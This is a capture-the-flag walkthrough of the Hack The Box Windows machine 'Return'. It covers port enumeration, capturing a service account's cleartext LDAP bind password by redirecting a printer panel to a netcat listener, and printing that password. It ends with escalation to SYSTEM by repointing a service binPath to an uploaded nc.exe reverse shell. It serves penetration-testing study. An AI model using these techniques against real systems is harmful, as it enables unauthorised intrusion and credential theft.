# Machine Info

Return is an easy-rated Windows Active Directory machine. It involves dumping the svc-printer password from an LDAP bind request. For privilege escalation, the svc-printer user was a member of the Server Operator group, which can start and stop any service on the box. We will abuse this capability to obtain a shell as root.

## Scanning through Nmap

First of all we will go with nmap to scan the whole network and check for services running on the network. To scan the whole network and find all the open ports i use **-p-** used to scan the whole **65535** ports with **--min-rate 10000** to scan network faster from **nmap** and i found a list of open ports on the network and get only the open ports using different terminal tools like **cut**, **tr** etc. 

```shell
$ nmap -p- --min-rate 10000 10.129.95.241 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49673,49674,49675,49676,49680,49697
```

Now Let's run the depth scan on these specific ports using:

```bash
$ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49673,49674,49675,49676,49680,49697-sC -sV -A -T4 10.129.95.241 -oN scan.txt
```

- **-sC** is to run all the default scripts
- **-sV** for service and version detection
- **-A** to check all default things
- **-T4** for aggressive scan
- **-oN** to write the result into a specified file

## Information Gathering

Through Nmap we found port **53 DNS** is open which can be used to perform zone transfer, **88 kerberose** is open which can be used to for enumeration purpose here, **139 & 445 SMB** ports are open and can be used to enumerate shares with anonymous user for initial access, **389 ldap** port is open, **80 HTTP** web server is also running, **5985 winrm** port is opened which can be used to login into machine if somehow we managed to obtain a valid credentials. Nmap discover Doamin name by using ldap scripts which is **htb.local**. Let's add this to our local DNS file called `/etc/hots` so that our computer can resolve this domain. 

```bash
$ echo "10.129.95.241   return.local" | sudo tee -a /etc/hosts
```

### Port 53 DNS

Let's start with the port **53** DNS and try to perform zone using **dig** (**dig** stands for **Domain Information Grabber**. It is used for retrieving information about DNS name servers. It is used for verifying and troubleshooting DNS problems and to perform DNS lookups). The complete command will be `dig axfr @10.129.95.241 return.local`. Here **axfr** is a protocol(AXFR is **a protocol for “zone transfers” for replication of DNS data across multiple DNS servers**. Unlike normal DNS queries that require the user to know some DNS information ahead of time, AXFR queries reveal resource records including subdomain names). But we couldn't able to fetch any useful information.

```bash
$ dig axfr @10.129.95.241 return.local

; <<>> DiG 9.19.21-1-Debian <<>> axfr @10.129.95.241 return.local
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

### Port 88 Kerberose

Let's move towards our Enumeration next part which is port **88** kerberose. We can use it to enumerate user's because we don't have any valid credentials yet. To enumerate user in Domain, we will use tool called **kerbrute**(A tool to quickly bruteforce and enumerate valid Active Directory accounts through **Kerberos Pre-Authentication**) . it can also be used to perform password spraying on domain if somehow we managed to find a valid password. **Kerbrute** provide us many functions including

```
Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit
```

We will be using that **userenum** function. The command we will use will be 
```bash
$ kerbrute userenum -d return.local  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.129.95.241
```

-  **-d** is for domain name 
- **--dc** for domain controller.

 We found two valid user's on the domain, **administrator** and **printer**
 
```bash
$ kerbrute userenum -d return.local  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.129.95.241

    __             __               __

2024/04/15 14:58:03 >  	10.129.95.241:88

2024/04/15 15:03:34 >  [+] VALID USERNAME:	 printer@return.local
```
### Port 389 Ldap

Using **ldapsearch** we can enumerate user's in domain, domain [naming context](https://en.wikipedia.org/wiki/Naming_Context) etc. Let's First discover naming context of domain. The command will be 
```bash
$ ldapsearch  -x -H ldap://10.129.95.241 -s base namingcontexts
```

 - **-x** for simple authentication,
 - **-H** for host,
 - **-s** to set scope to base
 - **namingcontext** for getting naming context of domain

```bash
$ ldapsearch  -x -H ldap://10.129.95.241 -s base namingcontexts
#
dn:
namingcontexts: DC=return,DC=local
namingcontexts: CN=Configuration,DC=return,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=return,DC=local
namingcontexts: DC=DomainDnsZones,DC=return,DC=local
namingcontexts: DC=ForestDnsZones,DC=return,DC=local
```

Because we don't have valid ldap credentials, so we can't make successful session with ldap and can't enumerate user's and also null session is blocked 

```bash
$ ldapsearch -x -b "dc=return,dc=local" "*" -H ldap://10.129.95.241
# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563
```


### Port 139 & 445 SMB

We also have SMB ports open, let's try to list out smb shares if are available publicly using **smbclient**(The smbclient lets you **send messages to workstations, display browse lists and connect to SMB shares**). The command will be `smbclient -N -L \\10.129.95.241` 
- **-L** for list our shares.
- **-N** for null session
But there is no share available for us. 

```bash
$ smbclient -N -L \\10.129.95.241
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
```

### Port 80 HTTP

Port 80 was also open on the network, which meas their is a some kind of web server is running on it. There is a HTB Printer Admin Panel is running on port 80 with only one button enabled called settings on navbar which is redirecting us to **settings.php** endpoint which also indicate that there is a PHP running at the backend of the website.

<img alt="Pasted image 20240416001509" src="https://github.com/iammR0OT/HTB/assets/74102381/19bd6c78-8f66-4363-8edb-ad088461816a">

On Settings.php endpoint there is some kind of ldap connection setting is running. There we found a user name. Password of the user was all asterisks which i thought at very first that the input type is password that's why we are seeing this but when i inspect that input filed, the type of the passowrd field is itself text. and all this is trying to connect with **printer.return.local** on port **389**.

<img  alt="Pasted image 20240416002336" src="https://github.com/iammR0OT/HTB/assets/74102381/239ad33f-71b6-4ae6-98ba-3aea5368e7b2">

When i intercept the request thorough burp proxy, only the IP filed was going in the request all the other username, port and password fields was not there.

<img alt="Pasted image 20240416003138" src="https://github.com/iammR0OT/HTB/assets/74102381/4330cc5c-52e0-4bef-aa21-ca580cfae247">

So i run a netcat listener on my machine and change the IP address with my attacker machine IP address on port 389 so that the request got captured on my listener. In response i got username and it's clear text password which was used for authentication in the bind request.

```bash
svc-printer : 1edFg43012!!
```

### Shell as svc-printer

As we discovered through Nmap that the WinRM port 5985 is open, we can use a tool called **Evil-WinRM** to log in to the **svc-printer** account.

```bash
$ evil-winrm -i 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
*Evil-WinRM* PS C:\Users\svc-printer\Documents>
```

Our user flag is present on Desktop folder.

# Privilege Escalation

Firstly, Let's check what  group of member  **svc-printer** user is.

```bash
$ net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/26/2021 1:39:29 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
```

So we are member of **Server Operator**, **Remote Management**, **Print Operators** group members.

### Server Operators

According to Microsoft official documentation [here](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators)

```
Members of the Server Operators group can administer domain controllers. This group exists only on domain controllers. By default, the group has no members. Members of the Server Operators group can take the following actions:
- sign in to a server interactively, 
- create and delete network shared resources,
- start and stop services, 
- back up and restore files, 
- format the hard disk drive of the computer, 
- shut down the computer.
This group can't be renamed, deleted, or removed.
```

So, we can start and stop services on the box. **services** command is a built in feature of **evil-winrm** that list down the running services on the box. 

![Pasted image 20240418230131](https://github.com/iammR0OT/HTB/assets/74102381/3f78bec0-7e0a-4299-996a-6d35b794b733)

We have a list of services running on the box, we can start and stop any of the one because we are in **Server Operator** group. For service management, we can use both **sc** (Service Control) or **PsService.exe** from windows PS toolkit. In This box we will be using **sc.exe** with **config** flag to change the **binPath**

![Pasted image 20240418232534](https://github.com/iammR0OT/HTB/assets/74102381/966a068e-5abd-44e5-a391-07bfcb77b16a)

Because whenever the any service loads in windows, it loads from it's **binPAth**. What if we change the **binPath** to our malicious file and execute that file on the behalf of valid service. 

### [Exploitation](https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/)

Let's upload **nc.exe** file on box using evil-winrm built-in feature called **upload**

```bash
$ *Evil-WinRM* PS C:\Users\svc-printer\Desktop>  upload /home/kali/Desktop/htb/return/nc.exe
```

Now change the **binPath** of any of the services which is running with privileges on the box with our malicious **nc.exe** file.
I chose  service called **VMTools** for exploitation. Let's reconfigure it's path to our malicious file so that whenever next time this service try to load it's exe file it load our malicious exe file.
Let's make this in practical. Use **config** to change the **binPath**, **stop** to stop the service, **query** to check the status of service if it is still being running at the background and the final **qc** to check if the **binPath** is updated with our malicious file path.

![Pasted image 20240418235629](https://github.com/iammR0OT/HTB/assets/74102381/827ec837-347c-4bcc-bd86-7ccccbfcab79)

All things are set Let's run a reverse listener using **nc** to get shell back using: 

```bahs
$ nc -lvnp 9001
```

After running the listener, start the **VMTools** service again, you will notice you got a shell as `nt authority\system` on you listener within a second
